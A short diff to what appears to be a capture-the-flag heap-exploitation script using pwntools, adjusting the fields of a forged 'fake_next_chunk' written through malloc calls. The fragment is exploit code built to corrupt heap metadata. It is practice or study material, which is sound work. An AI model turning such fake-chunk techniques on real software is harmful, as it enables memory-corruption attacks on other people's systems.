@@ -50,12 +50,12 @@ menu(2)
 malloc(0x40, p64(name+0x500)) # Write fake_chunk
 
 fake_next_chunk = flat(
-    0x500,      # next_chunk.prev_size
+    0,          # next_chunk.prev_size
     0x21,       # next_chunk.size
     0,
     0,
-    0,
-    0x21
+    0,          # next_next_chunk.prev_size
+    0x21        # next_next_chunk.size  
 )
 
 malloc(0x40, b'B'*8)
